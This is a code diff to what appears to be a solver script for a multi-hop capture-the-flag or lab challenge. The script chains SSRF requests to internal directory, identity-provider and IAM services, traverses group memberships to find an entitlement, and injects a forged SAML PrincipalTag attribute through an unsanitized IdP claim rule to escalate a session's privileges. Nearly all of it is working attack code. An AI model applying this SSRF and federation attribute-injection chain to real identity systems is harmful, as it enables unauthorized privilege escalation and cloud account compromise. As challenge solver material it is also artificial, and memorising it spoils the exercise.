@@ -89,7 +89,7 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     bind = ssrf(f"{DIR}/dir/bind?cred={account}:{pw}")
     if "member_of" not in bind:
         raise SolveError(f"bind failed: {bind}")
-    seen, stack, winning, entitlement, winning_attrs = set(), list(bind["member_of"]), None, None, {}
+    seen, stack, winning, entitlement, owner_team = set(), list(bind["member_of"]), None, None, None
     while stack:
         g = stack.pop()
         if g in seen:
@@ -98,25 +98,22 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         info = ssrf(f"{DIR}/dir/groups?name={urllib.parse.quote(g)}")
         if isinstance(info, dict):
             if (info.get("entitlement") or "").startswith("fed:request-role:"):
-                winning, entitlement, winning_attrs = g, info["entitlement"], info.get("attributes", {})
+                winning, entitlement, owner_team = g, info["entitlement"], info.get("owner_team")
             stack += info.get("member_of", [])
     if not winning:
         raise SolveError("no reachable federation-entitled group found")
     granted_role = entitlement.split(":")[-1]
-    # the deploy-eligibility project code is a directory attribute of the entitled group (discovered here)
-    project_code = next(iter(winning_attrs.values())) if winning_attrs else None
     entresp = ssrf(f"{DIR}/dir/entitlement?p={b64u({'user': account, 'password': pw, 'group': winning})}")
     marker(entresp)
     ent = entresp["entitlement_token"]
-    st.update(winning_group=winning, entitlement_token=ent, granted_role=granted_role,
-              project_code=project_code)
+    st.update(winning_group=winning, entitlement_token=ent, granted_role=granted_role, owner_team=owner_team)
 
-    # ---- hop 4: federation claim-smuggling -----------------------------------------------------
+    # ---- hop 4: federation attribute injection (correlate 3 sources) ---------------------------
     a0 = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': granted_role, 'attributes': {}})}")
     sess0 = ssrf(f"{IAM}/iam/session?assertion={a0['assertion']}")["session"]  # bootstrap, tag-less
     desc = ssrf(f"{IAM}/iam/describe?session={sess0}")
     family = desc.get("escalation_family")
-    fed_family = desc.get("federation_family", "nested-attr")
+    fed_family = desc.get("federation_family", "principal-tag")
 
     def find_condition(d):
         if isinstance(d, dict):
@@ -131,15 +128,14 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         return None
 
     tag_name, _ = find_condition(desc)
-    # The trust value is the project code discovered in the directory (two independent evidence pieces:
-    # the IAM condition names the tag; the directory publishes the code). Inject it via the family's
-    # real attribute-injection vector (the IdP passes caller attributes through unsanitized).
-    tag_value = project_code
-    if fed_family == "delimited-claim":
-        attrs = {"https://idp.corp.internal/claims/session-tags": f"{tag_name}={tag_value}"}
-    else:  # principal-tag — the real AWS SAML PrincipalTag attribute
-        attrs = {f"https://aws.amazon.com/SAML/Attributes/PrincipalTag:{tag_name}": tag_value}
-    smug = {"entitlement": ent, "role": granted_role, "attributes": attrs}
+    # (a) INJECTION POINT: which caller source attribute does the IdP claim rule map to the honored tag?
+    rules = ssrf(f"{IDP}/idp/claim-rules")["rules"]
+    source_attr = next(r["source"] for r in rules if r["emits_tag"] == tag_name)
+    # (b) VALUE: the project_code of the project owned by the entitled group's team (correlate the catalog)
+    projects = ssrf(f"{DIR}/dir/projects")["projects"]
+    tag_value = next(p["project_code"] for p in projects if p["owner_team"] == owner_team)
+    # (c) inject the SOURCE attribute; the IdP claim rule emits it as the honored tag (its value is ours)
+    smug = {"entitlement": ent, "role": granted_role, "attributes": {source_attr: tag_value}}
     a1 = ssrf(f"{IDP}/idp/assert?p={b64u(smug)}")
     sess1_resp = ssrf(f"{IAM}/iam/session?assertion={a1['assertion']}")
     marker(sess1_resp)  # h4 — credited ONLY here, when the smuggled tag actually lands on the session
